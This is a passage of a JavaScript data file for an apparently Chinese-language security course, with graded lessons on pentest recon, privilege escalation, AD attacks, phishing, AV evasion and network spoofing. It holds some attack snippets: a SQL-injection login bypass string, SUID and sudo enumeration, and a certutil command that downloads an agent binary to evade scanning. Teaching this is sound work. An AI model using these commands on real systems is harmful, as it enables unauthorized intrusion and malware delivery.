          refs: "随机数安全实践"
        },
        {
          id: "crypto-side-channel", name: "侧信道与实现安全", level: "高级",
          summary: "算法没错，实现会漏：时间差、错误信息、功耗都会泄露秘密；侧信道是「绕过数学」的攻击路径。",
          keywords: ["侧信道","时间攻击","错误信息","实现安全","常量时间"],
          levels: {
            "入门": "就算加密算法本身没毛病，程序运行时的「快慢、报错内容」也可能暴露秘密信息。",
            "初级": "常见类型：时间差（比较字符串提前返回）、错误信息差异（区分用户不存在与口令错误）、缓存与分支差异；还有功耗与电磁等物理侧信道。",
            "中级": "实战：重点是「比较与查表要常量时间」，认证失败信息要统一；口令与令牌比较必须用常量时间比较函数。",
            "高级": "深入：理解 padding oracle 类攻击（通过错误差异逐字节推断明文）、以及硬件侧信道需要专业设备与环境；防护靠常量时间实现与统一错误处理。",
          },
          codeLang: "text",
          code:
`实现安全自查
· 口令/令牌比较是否常量时间？（禁普通字符串比较）
· 登录失败信息是否统一（不区分账号是否存在）？
· 解密失败是否返回统一错误（防 padding oracle）？
· 敏感分支是否依赖秘密值（可能被时间差区分）？
`,
          tool: "常量时间比较库、错误处理规范",
          refs: "侧信道与实现安全实践"
        },
      ]
    },

    /* ---------------- 渗透测试 ---------------- */
    {
      id: "pentest", name: "渗透测试", icon: "🎯",
      desc: "方法论与流程：授权前提下的信息收集、漏洞利用、后渗透与报告。",
      topics: [
        {
          id: "recon", name: "信息收集", level: "入门",
          summary: "资产、域名、端口、服务的被动/主动侦察。",
          keywords: ["信息收集","侦察","recon","nmap","子域名","端口扫描","whois","资产","被动侦察","主动侦察"],
          levels: {
            "入门": "动手测试前先「摸清家底」：这个组织有哪些域名、IP、开放了哪些端口和服务。信息越全，可下手的点越多。一切必须基于授权范围。",
            "初级": "被动：WHOIS、证书透明度（crt.sh）、搜索引擎、GitHub 泄露。主动：端口扫描（Nmap）、服务指纹、目录爆破（gobuster）。产出资产清单。",
            "中级": "OSINT 技巧、DNS 区域传输、ASN 枚举、WAF/CDN 识别、云资产（S3/OSS 桶）发现。结合 Shodan/Censys。",
            "高级": "自动化资产测绘、攻击面管理（ASM）思路、以及如何在红蓝对抗中系统化收敛范围并出具侦察报告。"
          },
          codeLang: "bash",
          code:
`# ✅ 仅对【你拥有授权】的目标做端口与版本探测
nmap -sV -sC -oA report 10.10.10.10
# 子域名枚举（授权域名）
subfinder -d example.com -o subs.txt
# 目录/接口发现
gobuster dir -u https://example.com -w wordlist.txt`,
          tool: "Nmap、subfinder、amass、gobuster、crt.sh",
          refs: "MITRE ATT&CK Reconnaissance；Nmap 官方文档"
        },
        {
          id: "scan", name: "漏洞扫描与验证", level: "初级",
          summary: "用工具发现疑似漏洞并人工验证，避免误报。",
          keywords: ["漏洞扫描","scanner","漏洞验证","误报","nuclei","nessus","awvs","poc","exp"],
          levels: {
            "入门": "扫描器像「自动体检」，能列出一堆疑似问题。但它会误报，必须人工确认每条是否真的存在、是否在授权范围内，再决定是否深入。",
            "初级": "工具：Nuclei（模板化）、Nessus、OpenVAS、AWVS。流程：扫描 → 去重 → 人工验证（PoC） → 定级（CVSS）。注意：扫描动作本身也可能影响业务，需获书面授权与窗口期。",
            "中级": "编写/裁剪 Nuclei 模板、理解扫描器指纹逻辑、结合版本比对（CVE 匹配）。区分信息/低/中/高/危重。",
            "高级": "建立企业级漏洞管理闭环（发现-验证-修复-复测）、误报治理，以及与 SRC/赏金计划协作。"
          },
          codeLang: "bash",
          code:
`# ✅ Nuclei 对授权目标跑社区模板（仅授权范围）
nuclei -u https://example.com -t cves/ -o results.txt
# 注意：扫描前确认书面授权，避免影响生产系统`,
          tool: "Nuclei、Nessus、OpenVAS",
          refs: "CIS 基准；CVSS 3.1 规范"
        },
        {
          id: "privesc", name: "权限提升", level: "中级",
          summary: "从低权限用户到系统/域控提权。",
          keywords: ["提权","privilege escalation","privesc","sudo","suid","内核漏洞","window提权","令牌","计划任务"],
          levels: {
            "入门": "拿到一个普通账号后，想办法变成管理员/root，才能做更多事。常见口子：配置错误的计划任务、可写的服务路径、过时的内核漏洞。",
            "初级": "Linux：SUID 滥用、sudo 误配（sudo -l）、cron、可写文件、内核 exp。Windows：服务权限、始终安装提权、令牌冒充、未打补丁。",
            "中级": "系统化枚举（LinPEAS/WinPEAS）、利用漏洞与配置弱点组合、建立稳定提权路径而非单点 exp。",
            "高级": "域环境（AD）提权：Kerberoasting、ACL 滥用、委派；以及缓解视角（最小权限、补丁、加固）。"
          },
          codeLang: "bash",
          code:
`# 枚举提权线索（在已授权主机上）
sudo -l                 # 查看可免密执行的命令
find / -perm -4000 2>/dev/null   # 找 SUID 文件
# ✅ 防御：最小权限、及时打补丁、审计 sudoers`,
          tool: "LinPEAS、WinPEAS、GTFOBins、BloodHound",
          refs: "GTFOBins；MITRE ATT&CK Privilege Escalation"
        },
        {
          id: "lateral", name: "横向移动", level: "中级",
          summary: "在内网中从一台主机移动到其他主机/域控。",
          keywords: ["横向移动","lateral","内网","pth","黄金票据","pass the hash","smb","域渗透","凭证窃取"],
          levels: {
            "入门": "攻陷一台机器后，用它作跳板去碰同一内网的其他机器（因为内网彼此更信任）。常见：用偷来的密码/哈希登录别的机器。",
            "初级": "技术：Pass-the-Hash/Pass-the-Ticket、SMB/WinRM 横向、票据（Silver/Golden Ticket）、凭证导出（Mimikatz，仅授权演练）。",
            "中级": "域环境：BloodHound 路径分析、ACL 攻击、委派利用；Linux 内网：SSH 密钥复用、内网服务跳板。",
            "高级": "复杂杀伤链建模、检测与狩猎（EDR/SIEM 视角），以及红队如何在授权范围约束下收敛行为。"
          },
          codeLang: "powershell",
          code:
`# ⚠️ 仅用于授权演练环境；以下展示的是【检测与防御】关注点
# 防御侧：启用 LSA 保护、限制本地管理员横向、部署凭据守卫
# 攻击侧（示意）：Mimikatz 导出需管理员且明显触发 EDR，故现代实战更依赖无文件技术`,
          tool: "BloodHound、Impacket、CrackMapExec（授权环境）",
          refs: "MITRE ATT&CK Lateral Movement；AD 安全红皮书"
        },
        {
          id: "report", name: "后渗透与报告", level: "初级",
          summary: "保持访问、收集证据并以可落地方式交付报告。",
          keywords: ["后渗透","报告","report","证据","截图","修复建议","cvss","交付","复盘"],
          levels: {
            "入门": "找到漏洞不是终点。要整理清楚：在哪、怎么复现、影响多大、怎么修。给客户/团队一份能直接行动的修复报告，比炫技更重要。",
            "初级": "报告要素：概述、范围、方法论、漏洞清单（复现步骤+截图+影响+POC）、风险评级（CVSS）、修复建议、附时间线。证据留痕要完整可追溯。",
            "中级": "量化业务影响、给出优先级与加固路线、区分「可被利用」与「理论存在」。后渗透中保持访问须谨慎且合法（持久化仅限授权演练）。",
            "高级": "与安全运营（SOC）对接复测闭环、建立可度量的安全改善指标，并推动流程与架构层面的长治久安。"
          },
          codeLang: "markdown",
          code:
`# 渗透测试报告模板（片段）
## 漏洞：SQL 注入（高危）
- 位置：/login 用户名参数
- 复现：' OR '1'='1 绕过登录
- 影响：越权访问、数据泄露
- 修复：参数化查询 + 最小权限 DB 账号
- 证据：附请求/响应截图与时间戳`,
          tool: "Markdown、截图、CVSS 计算器",
          refs: "OWASP WSTG；渗透测试执行标准 PTES"
        },
        {
          id: "oauth", name: "OAuth/SSO 攻击", level: "中级",
          summary: "OAuth2/OIDC 授权流程中的实现缺陷与令牌泄露。",
          keywords: ["oauth","oidc","单点登录","sso","授权码","redirect uri","令牌","id token","开放授权"],
          levels: {
            "入门": "很多网站用「微信/Google 登录」。背后是 OAuth 这套授权协议：你授权第三方应用访问你的部分信息。如果实现不严谨，攻击者可能偷到令牌或冒用登录。",
            "初级": "常见坑：redirect_uri 未校验被劫持到攻击者站、授权码被截获重放、implicit 流程令牌留在 URL、state 缺失导致 CSRF、id_token 不验签名。防御：严格校验 redirect_uri、用 PKCE、校验 nonce/aud。",
            "中级": "利用：redirect_uri 绕过（开放重定向拼接）、PKCE 缺失下的授权码注入、refresh token 泄露、scope 膨胀。结合 XSS 偷 token。",
            "高级": "深入 OIDC 混合流、JWT 与 OAuth 的交叉陷阱、以及「登录 CSRF」对业务的影响。OAuth 是框架不是安全保证，安全取决于正确实现与威胁建模。"
          },
          codeLang: "http",
          code:
`# ✅ 授权码流程务必用 PKCE + state，并严格白名单 redirect_uri
# 客户端：生成 code_verifier + code_challenge=BASE64URL(SHA256(verifier))
# 服务端：校验 redirect_uri 完全匹配、code 仅可用一次、state 防 CSRF
# ❌ 危险：implicit 流程把令牌放 URL fragment，易被泄漏`,
          tool: "Burp、OAuth 测试清单、JWT 工具（授权）",
          refs: "RFC 6749/8252；OWASP OAuth2 备忘"
        },
        {
          id: "cloud-basics", name: "云安全基础", level: "中级",
          summary: "云环境（AWS/GCP）常见错误配置与元数据/凭据泄露。",
          keywords: ["云安全","云","aws","s3","gcp","元数据","imds","凭据泄露","对象存储","桶"],
          levels: {
            "入门": "现在大量系统跑在云上（阿里云/腾讯云/AWS/GCP）。云上最常见的不是 0day，而是「配置错了」：公开的对象存储桶、写死的密钥、过宽的权限，导致数据外泄。",
            "初级": "典型风险：S3/OSS 桶公开可读/可写、AK/SK 泄露（代码/前端/日志）、IMDSv1 被 SSRF 读取拿临时凭证、安全组暴露 22/3389。防御：桶私有+加密、密钥轮转、IMDSv2。",
            "中级": "利用：枚举公开桶、从前端 JS 提取 AK、SSRF 打 169.254.169.254、IAM 权限枚举（权限过大）。组合 SSRF→元数据→提权是云上经典链。",
            "高级": "深入 IAM 策略评估逻辑、角色扮演链、跨账户访问、以及云原生威胁检测（CloudTrail/GuardDuty）。云安全是「配置即代码」的纪律问题。"
          },
          codeLang: "bash",
          code:
`# ✅ 启用 IMDSv2（防 SSRF 读元数据）+ 桶私有加密
# AWS CLI 强制 hop limit=1 且需 token
aws ec2 modify-instance-metadata-options --http-tokens required --http-put-response-hop-limit 1
# ✅ S3 桶禁止公开、启用默认加密与版本控制`,
          tool: "ScoutSuite、Prowler、云厂商配置审计（授权）",
          refs: "AWS Well-Architected 安全；CIS 云基准"
        },
        {
          id: "ad", name: "域渗透 AD", level: "高级",
          summary: "Active Directory 域渗透：票据、委派与 ACL 滥用。",
          keywords: ["域渗透","active directory","ad","kerberos","白银票据","黄金票据","kerberoasting","委派","bloodhound"],
          levels: {
            "入门": "企业内网常用 Windows 域（Active Directory）统一管理账号和电脑。域渗透就是研究如何在已获一定权限后，沿着域里的信任关系一步步拿到「域控」最高权限。",
            "初级": "基础：Kerberos 认证、AS-REQ/AS-REP（无预认证可离线爆破用户）、Service Ticket（Kerberoasting 爆破服务账户）、黄金/白银票据。工具：Impacket、BloodHound。",
            "中级": "利用：Kerberoasting、AS-REP Roasting、委派滥用（约束/非约束）、ACL 攻击（DCSync 权限）、NTLM 中继。BloodHound 找最短提权路径。",
            "高级": "深入票据生命周期、组策略滥用、以及检测与狩猎（EDR/SIEM 视角）。域渗透多在「已授权红队」范围内，防御要靠最小权限+审计+EDR。"
          },
          codeLang: "powershell",
          code:
`# ⚠️ 仅授权演练；以下聚焦【检测与防御】
# 防御侧：启用 LSA 保护、审计 Kerberos、限制委派、部署凭据守卫与 EDR
# 攻击侧（示意，触发 EDR）：Rubeus kerberoast / mimikatz sekurlsa`,
          tool: "BloodHound、Impacket、Rubeus（授权环境）",
          refs: "MITRE ATT&CK；AD 安全红皮书"
        },
        {
          id: "osint", name: "开源情报收集 OSINT", level: "入门",
          summary: "从公开渠道合法收集目标信息（子域/员工/技术栈），是授权测试信息收集阶段。",
          keywords: ["osint","开源情报","公开来源情报","信息收集","reconnaissance","子域名","泄露查询","whois","证书透明","攻击面"],
          levels: {
            "入门": "攻击前先「摸情况」。OSINT 指从公开渠道（官网、社交平台、Whois、代码仓库、泄露库）合法收集目标信息——员工、邮箱、子域名、技术栈。这是授权渗透测试信息收集阶段的重要部分。",
            "初级": "常用来源：Whois/ASN、子域名枚举（证书透明日志、DNS）、GitHub/代码泄露（密钥、内部路径）、搜索引擎语法（site:/filetype:）、泄露查询。纪律：仅收集授权目标、不触碰未授权个人数据。",
            "中级": "实战：用 CT 日志被动收集子域、从 JS 提取 API 端点、员工邮箱→钓鱼/口令爆破面、把零散信息拼出攻击面图。与被动扫描结合，降低对目标的直接探测。",
            "高级": "深入情报关联分析、自动化采集管线、以及「防御侧」如何用 OSINT 做攻击面管理（ASM）与暴露面收敛。OSINT 强调合规边界：仅用于授权范围与自身资产盘点。"
          },
          codeLang: "bash",
          code:
`# 被动收集：从证书透明日志枚举子域（无需直接探测目标）
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u
# Whois 与 ASN 信息（公开、合法）
whois example.com
# ⚠️ 仅对授权目标执行；不收集/利用未授权个人隐私数据`,
          tool: "theHarvester、amass、crt.sh、Maltego（授权）",
          refs: "OWASP Amass 文档；OSINT 框架（osintframework.com）"
        },
        {
          id: "social", name: "社会工程与钓鱼", level: "初级",
          summary: "利用人的信任/疏忽（钓鱼邮件、冒充、诱饵）突破技术防线；红队检验意识。",
          keywords: ["社会工程","社工","钓鱼","phishing","鱼叉钓鱼","pretexting","诱饵","冒充","安全意识","红队","bcc"],
          levels: {
            "入门": "再坚固的技术防线，也可能被「骗人」攻破。社会工程利用人的信任或疏忽：伪装成同事要密码、发带毒的邮件让你点开。钓鱼邮件就是最常见的例子。防御靠「人」的安全意识。",
            "初级": "常见手法：钓鱼邮件（伪造发件人/紧急话术）、鱼叉钓鱼（针对特定人定制）、诱饵（U 盘/下载）、冒充（IT 支持要验证码）、pretexting（编造场景套信息）。红队用它检验防护与意识。防御：验证身份（电话回拨）、不点不明链接、MFA、邮件防伪（DMARC/DKIM/SPF）。",
            "中级": "实战（授权红队）：克隆登录页收凭证、恶意附件（宏/快捷方式）、结合 OSINT 定制话术、用相似域名（typosquatting）提升可信度。评估的是「流程与人」而非纯技术。",
            "高级": "深入商业邮件诈骗（BEC）、供应链社工、以及度量安全意识成熟度（钓鱼演练通过率）。强调：社工是「信任」攻击，防护要把技术控制（MFA/零信任）与人的培训结合，且红队必须严格授权与去危害化。"
          },
          codeLang: "http",
          code:
`# ✅ 邮件防伪三件套（防御侧，降低钓鱼成功率）
# DNS 中配置：
#   SPF：v=spf1 include:_spf.example.com ~all
#   DKIM：邮件签名，公钥发布在 DNS
#   DMARC：v=DMARC1; p=reject; rua=mailto:sec@example.com
# ✅ 用户侧：收到「紧急改密码/验证码」一律电话回拨官方核实，不点链接`,
          tool: "GoPhish（授权钓鱼演练）、邮件头分析、DMARC 检测",
          refs: "NIST SP 800-63B；反钓鱼工作手册；OWASP 社会工程"
        },
        {
          id: "priv-esc", name: "权限提升", level: "高级",
          summary: "在拿到低权限 shell 后，利用系统配置、内核或服务缺陷升至 root/System。",
          keywords: ["权限提升","privilege escalation","提权","sudo","内核漏洞","计划任务","root","system"],
          levels: {
            "入门": "拿到一个普通账号后，想拿到最高权限（管理员/root）。办法是找系统里配错或存在漏洞的地方，借它提升自己的权力。",
            "初级": "Linux：sudo 误配置（NOPASSWD 加可写脚本）、SUID 二进制、cron 任务、内核漏洞（脏牛等）。Windows：计划任务、服务权限、AlwaysInstallElevated、令牌冒充。工具：LinPEAS/WinPEAS 自动化枚举。",
            "中级": "实战：跑 PEAS 脚本看高亮项；检查可写路径或服务；利用暴露的凭据（history、配置文件）。防御：最小化 sudo、及时打补丁、限制服务权限。",
            "高级": "深入：内核利用的可靠性与崩溃风险、DLL 劫持链、以及从用户态到内核态的完整提权。强调：提权本质是信任边界上的配置错误被放大。"
          },
          codeLang: "bash",
          code:
`sudo -l                       # 看当前用户能以谁的身份跑什么
find / -perm -4000 2>/dev/null   # 找 SUID 二进制
# ❌ 危险：NOPASSWD 且脚本可写 -> 直接提权
(ALL) NOPASSWD: /home/user/backup.sh`,
          tool: "LinPEAS、WinPEAS、GTFOBins、PowerUp",
          refs: "GTFOBins；MITRE ATT&CK 提权；PEAS 文档"
        },
        {
          id: "av-bypass", name: "免杀与 AV 绕过", level: "高级",
          summary: "理解终端防护检测逻辑，掌握载荷编码、混淆与合法化（LOLBins）以通过授权测试。",
          keywords: ["免杀","av bypass","反病毒","载荷","编码","lolbins","edr","混淆"],
          levels: {
            "入门": "安全软件会扫描可疑程序。做授权测试时，为了让自己的测试工具不被误杀，需要理解它的检测规则并合理绕过——但绝不可用于恶意目的。",
            "初级": "检测维度：签名（哈希或字节）、行为（API 序列）、启发式。绕过：载荷编码或加密（运行时解密）、分离加载器与主体、利用系统自带合法程序（LOLBins：certutil、mshta）。强调：仅授权环境、且以评估防御有效性为目的。",
            "中级": "实战：用 msfvenom 编码做基础规避（常被秒杀，仅作基线）；自写加载器（API 动态解析、沙箱规避）；利用可信二进制执行。防御侧：EDR 的行为与内存扫描远强于传统 AV。",
            "高级": "深入：AMSI 绕过、进程注入（Early Bird/Thread Hijacking）、以及内存中无文件载荷。强调：免杀是攻防持续对抗，目的是验证即便载荷落地，EDR 能否拦截，不是炫技。"
          },
          codeLang: "powershell",
          code:
`# 仅授权测试：用系统自带工具落地（LOLBin 思路示意）
# 从可信源拉取并内存加载，避免落盘被扫描
# 真实用法需结合授权范围与防御评估目标
certutil -urlcache -split -f http://internal/share/agent.bin`,
          tool: "msfvenom、Cobalt Strike（授权）、LOLBAS 项目",
          refs: "LOLBAS 项目；MITRE ATT&CK 防御绕过；仅授权测试"
        },
        {
          id: "pt-process", name: "渗透测试流程与授权边界", level: "入门",
          summary: "渗透测试是「在授权范围内模拟攻击」：先定范围与规则，再动手，全程留证。",
          keywords: ["渗透测试","授权","范围","规则","报告","合规"],
          levels: {
            "入门": "渗透测试不是随便打别人网站：必须先拿到书面授权，明确「能测哪些、什么时候测、不能做什么」。没有授权就是违法。",
            "初级": "标准流程：范围与规则确认 → 信息收集 → 漏洞发现与验证 → 影响评估 → 报告与复测。授权书要写明目标清单、时间窗、禁止动作（如破坏数据）与联系人。",
            "中级": "实战纪律：不越界（不碰范围外资产）、不做破坏性动作、发现严重问题立即通报；所有操作可追溯（记录时间与请求），便于复现与定责。",
            "高级": "深入：理解「合规测试」与「红队演练」的区别（目标不同：找漏洞 vs 检验检测响应），并根据目标设计测试策略与隐蔽程度。",
          },
          codeLang: "text",
          code:
`授权确认清单（动手前逐项确认）
□ 目标清单（域名/IP/应用/账号范围）
□ 时间窗与禁止时段
□ 禁止动作（拒绝服务、数据删除、社工员工）
□ 联系方式与应急通道
□ 报告要求与保密约定`,
          tool: "授权模板、测试记录工具",
          refs: "渗透测试标准流程；PTES"
        },
        {
          id: "pt-recon", name: "信息收集入门", level: "入门",
          summary: "先摸清目标「有什么」，再决定「打哪里」；被动收集优先，避免过早暴露。",
          keywords: ["信息收集","指纹","子域名","资产","被动","osint"],
          levels: {
            "入门": "动手前先做功课：目标有哪些域名、网站、对外服务？用公开信息就能查到很多，而且不会惊动对方。",
            "初级": "被动收集：搜索引擎、证书透明日志（找子域名）、whois、公开代码仓库；主动收集：端口扫描、指纹识别（框架/中间件版本）。",
            "中级": "实战：把收集到的资产整理成清单（域名/IP/端口/技术栈/负责人），标注来源与时间；资产测绘的目标是「不漏」，而不是快。",
            "高级": "深入：注意影子资产（无人维护的子域与测试环境）常是突破口；同时避免把收集行为变成对目标的压力（扫描频率与来源控制）。",
          },
          codeLang: "bash",
          code:
`# 被动收集示例（不接触目标）
# 证书透明日志找子域名：在 crt.sh 搜索 example.com
whois example.com
# 主动：确认授权后再做指纹与端口识别
nmap -sV -Pn target.example.com`,
          tool: "crt.sh、whois、nmap、指纹识别工具",
          refs: "信息收集方法；OSINT 实践"
        },
        {
          id: "pt-web-exp", name: "Web 漏洞利用复盘方法", level: "中级",
          summary: "从「发现一个点」到「讲清影响路径」：漏洞要能串成攻击链，才说明真实风险。",
          keywords: ["利用链","影响评估","复现","攻击路径","风险"],
          levels: {
            "入门": "发现一个漏洞还不够，要能说清「利用它能拿到什么」。单个小问题串起来可能变成严重问题。",
            "初级": "复盘要点：前置条件（需要什么权限/信息）、利用步骤（可复现）、影响（能否读数据/执行命令/横向）、以及最坏后果。",
            "中级": "实战：优先把「低危组合」串成链（如信息泄露 + 越权 + 上传 = 接管）；报告里给出攻击链图与最小复现步骤。",
            "高级": "深入：评估要结合业务影响（这笔数据值多少、能否造成停服），并与修复优先级对齐（不能全靠 CVSS 分数）。",
          },
          codeLang: "text",
          code:
`攻击链记录（示例）
1) 未授权接口泄露内部员工邮箱（信息泄露）
2) 用邮箱做口令喷洒拿到普通账号（认证弱点）
3) 普通账号可访问管理接口（越权）
→ 影响：可能修改业务数据；最小复现步骤已记录`,
          tool: "Burp Suite、复现脚本",
          refs: "漏洞评估与利用链"
        },
        {
          id: "pt-social", name: "社会工程与钓鱼演练", level: "中级",
          summary: "人是最难补的漏洞：钓鱼演练要用授权、有目标、有数据，重点在改进而非抓人。",
          keywords: ["社会工程","钓鱼","演练","授权","指标","培训"],
          levels: {
            "入门": "钓鱼就是伪装成可信的人或系统，骗你点链接或交出口令。这是现实中最高效的入口之一。",
            "初级": "演练要素：书面授权与范围、目标群体、邮件模板与落地页、指标（点击率/提交率/上报率）、以及事后培训。",
            "中级": "实战：模板要贴合真实业务（审批、工资、通知），但避免造成恐慌；必须提供「一键上报」通道，并统计上报率作为正向指标。",
            "高级": "深入：演练目的不是让人难堪，而是发现流程缺口（邮件网关规则、MFA 覆盖、上报通道是否顺畅）；对高权限岗位单独设计场景。",
          },
          codeLang: "text",
          code:
`钓鱼演练指标（关注趋势）
点击率 · 凭据提交率 · 上报率 · 上报平均耗时
目标：上报率上升、提交率下降（而不是抓出谁点了）
配套：一键上报入口 + 网关规则优化 + 针对性培训`,
          tool: "演练平台、邮件网关、上报入口",
          refs: "社会工程演练实践"
        },
        {
          id: "pt-report", name: "渗透报告与复测闭环", level: "初级",
          summary: "报告是渗透工作的交付物：写清风险、证据与修复建议，并跟踪到复测通过。",
          keywords: ["报告","风险等级","修复建议","复测","闭环","沟通"],
          levels: {
            "入门": "渗透做完要给报告：发现了什么问题、有多严重、怎么修、怎么验证修好了。",
            "初级": "报告结构：概述与范围、风险统计、逐条漏洞（描述/复现/影响/证据/修复建议）、附录（工具与测试记录）。",
            "中级": "实战：修复建议要具体到可执行（改哪个配置、加什么校验），并与开发一起评估修复代价；提交后安排复测确认。",
            "高级": "深入：把重复出现的问题归类（如「校验缺失」类），推动制度和框架层面的修补，而不是逐条打补丁。",
          },
          codeLang: "text",
          code:
`单条漏洞的写法（模板）
标题：订单详情接口存在水平越权
复现：登录 A 用户 → 请求 /api/order/1002（B 用户订单）→ 返回成功
影响：可读取他人订单与地址信息
修复：服务端校验资源归属（owner_id = 当前用户）
复测：修复后同请求返回 403`,
          tool: "报告模板、缺陷跟踪系统",
          refs: "渗透报告规范"
        },
        {
          id: "pt-dual-end", name: "移动与 Web 双端测试要点", level: "中级",
          summary: "同一套业务有两个客户端：后端校验不一致时，严格的一端挡不住宽松的一端。",
          keywords: ["双端","一致性","接口","越权","测试要点"],
          levels: {
            "入门": "同一个功能可能既有网页又有 App。如果 App 端检查松，攻击者可以用 App 绕过网页上的限制。",
            "初级": "测试思路：找出同一接口被两端调用的差异（参数、校验、频率限制），验证「通过 App 调用是否绕过了 Web 的限制」。",
            "中级": "实战：重点关注「前端做的限制」（如隐藏按钮、前端校验金额）在客户端是否可绕过；真正的安全必须在服务端。",
            "高级": "深入：评估要覆盖多端一致性（Web/App/小程序/开放 API），把「某端缺失校验」列为系统性风险而非单点问题。",
          },
          codeLang: "text",
          code:
`双端差异检查
· 同一接口：Web 有频率限制，App 是否有？
· 前端限制（按钮隐藏/金额校验）能否被绕过？
· 令牌与权限模型是否一致？
· 旧版本 App 是否仍是有效入口？`,
          tool: "Burp Suite、移动抓包",
          refs: "多端一致性测试"
        },
        {
          id: "pt-retest", name: "复测与风险接受流程", level: "初级",
          summary: "修复是否真的有效要靠复测；不能修的要显式登记为已接受风险，而不是不了了之。",
          keywords: ["复测","风险接受","闭环","登记","时限"],
          levels: {
            "入门": "开发说修好了，要实际再测一遍确认；确实修不了的，要写清「谁接受了这个风险」。",
            "初级": "复测动作：用原复现步骤验证问题是否消失，并检查是否有同类问题（同一模式的其他位置）。",
            "中级": "实战：复测不通过要给出具体证据（截图/请求响应）与预期差异；对无法修复项要求书面风险接受与补偿措施（如加监控）。",
            "高级": "深入：把「同类问题」上升为编码规范或框架级修复项，避免每轮测试都发现同一种漏洞。",
          },
          codeLang: "text",
          code:
`复测记录
漏洞：订单接口水平越权
原复现：请求他人订单返回 200
复测结果：返回 403 ✓（附响应）
同类检查：发票接口同样修复 ✓
未修复项：xxx（已登记风险接受，补偿措施：加访问告警）`,
          tool: "缺陷跟踪系统、复测清单",
          refs: "漏洞闭环实践"
        },
        {
          id: "pt-cloud", name: "云环境渗透要点", level: "高级",
          summary: "云上打点靠「身份与配置」：临时凭证、过宽角色与暴露的元数据比传统主机漏洞更容易得手。",
          keywords: ["云渗透","临时凭证","角色","元数据","暴露面"],
          levels: {
            "入门": "云上很多问题不是「系统有漏洞」，而是「权限配错了」——所以云渗透重点看身份与配置。",
            "初级": "入手点：暴露在公网的服务与存储、SSRF 打元数据获取临时凭证、代码仓库里的密钥、以及过宽的角色权限。",
            "中级": "实战：拿到临时凭证后先查「我是谁、能干什么」（身份与权限枚举），再找可横向的资源（存储、数据库、函数），全过程注意日志留痕与授权边界。",
            "高级": "深入：理解云上权限提升路径（角色链、信任关系、可扮演角色）与控制面审计的可见性——防御方要盯的正是这些动作。",
          },
          codeLang: "text",
          code:
`云渗透评估路径（授权测试）
1) 外部暴露面：公网服务、公开存储、泄露的密钥
2) 凭证获取：SSRF 打元数据、代码仓库、CI 变量
3) 权限枚举：当前身份能调用哪些 API、能访问哪些资源
4) 横向：可扮演角色、可读写的存储与数据库
注意：全程在授权范围内，控制动作避免影响业务
`,
          tool: "云 CLI、SSRF 测试、权限枚举",
          refs: "云安全评估实践"
        },
      ]
    },
    /* ---------------- 网络与内网安全 ---------------- */
    {
      id: "network", name: "网络与内网安全", icon: "🛰️",
      desc: "覆盖网络协议、资产测绘、局域网中间人、内网横向移动与域渗透，是红队进阶与内网防御的核心。",
      topics: [
        {
          id: "net-proto", name: "网络协议安全基础", level: "入门",
          summary: "理解 TCP/IP 分层与明文协议风险，是网络攻防与流量分析的基础。",
          keywords: ["网络协议","tcp/ip","三次握手","明文","arp","dns","分包","嗅探"],
          levels: {
            "入门": "互联网靠一套规则（协议）传数据。很多老协议是明文传输，别人在边上就能看到内容；理解这些规则才能发现哪里不安全。",
            "初级": "要点：TCP 三次握手与四次挥手、IP 路由、UDP 无连接；明文协议（HTTP/Telnet/FTP）易被嗅探；ARP/DNS 可被欺骗；分片与重组的处理差异可制造异常。基础工具：Wireshark 抓包看明文。",
            "中级": "实战：用 Wireshark 识别明文凭据、分析会话、定位异常包；理解 MTU/分片对 IDS 的影响；为后续 MITM 打基础。防御：全链路加密（HTTPS/TLS、SSH、VPN）、禁用明文服务。",
            "高级": "深入：协议状态机差异导致的绕过、IPv6 过渡机制（双栈）的新攻击面、以及在内网中用协议特性做隐蔽通信。强调：协议安全的核心是默认不信任网络、敏感数据必须加密。"
          },
          codeLang: "bash",
          code:
`# 抓包看明文（仅授权/本机）
tcpdump -i eth0 -A port 80       # 看 HTTP 明文内容
# 防御：用 TLS 替代，禁用明文服务
#   telnet -> ssh；ftp -> sftp；http -> https`,
          tool: "Wireshark、tcpdump、tshark",
          refs: "RFC 791/793；TCP/IP 详解；Wireshark 文档"
        },
        {
          id: "port-scan", name: "端口扫描与资产测绘", level: "初级",
          summary: "通过扫描识别开放端口、服务与版本指纹，绘制攻击面。",
          keywords: ["端口扫描","nmap","资产测绘","指纹","服务识别","syn扫描","banner"],
          levels: {
            "入门": "一个服务器开了很多门（端口），每个门后是一种服务。扫描就是逐个敲门，看哪些门开着、后面是什么，从而知道能从哪下手。",
            "初级": "Nmap 核心：TCP SYN 扫描（-sS，半开、隐蔽）、全连接（-sT）、UDP（-sU）、服务与版本探测（-sV）、OS 探测（-O）、脚本（-sC）。输出：开放端口 + 服务 + 版本 + 可能漏洞。合规：仅授权目标。",
            "中级": "实战：先全端口速扫再针对详扫；用 -sV 拿版本匹配 CVE；NSE 脚本做基础漏洞与配置检查；输出 XML 进资产管理。防御：最小化开放端口、用防火墙或主机隔离、关闭无用服务。",
            "高级": "深入：扫描规避（慢速/分片/诱饵）、指纹伪造识别、以及把扫描结果结构化进 CMDB 与攻击面管理（ASM）。强调：攻击者用扫描摸清家底，防御者更该先于攻击者看到自己的暴露面。"
          },
          codeLang: "bash",
          code:
`# 授权目标资产测绘
nmap -sS -sV -O -p- --min-rate 1000 target.com -oX out.xml
# -sS 半开扫描；-sV 版本；-O 系统；-p- 全端口`,
          tool: "Nmap、Masscan、RustScan",
          refs: "Nmap 官方文档；OWASP 资产识别"
        },
        {
          id: "arp-dns", name: "ARP/DNS 欺骗", level: "中级",
          summary: "在局域网内伪造地址解析，实施中间人（MITM）劫持流量。",
          keywords: ["arp欺骗","dns欺骗","mitm","中间人","嗅探","arp spoof","ettercap","cain"],
          levels: {
            "入门": "局域网里电脑靠名字到地址的广播来通信。攻击者假装自己是网关或某台机器，就能让别人的流量先经过自己，从而偷看或篡改。",
            "初级": "ARP 欺骗：伪造 ARP 应答，把受害者流量引到攻击者（配合转发可透明 MITM）。DNS 欺骗：污染缓存或回复假 IP，把域名指向恶意服务器。后果：凭据嗅探、会话劫持、钓鱼。工具：Ettercap、arpspoof。",
            "中级": "实战：开启 IP 转发避免断网；arpspoof 双向欺骗；用 Wireshark 看被劫持的明文会话；配合 SSLstrip 尝试降级 HTTPS。防御：静态 ARP 或 DAI（动态 ARP 检测）、DNSSEC、全 HTTPS（HSTS）。",
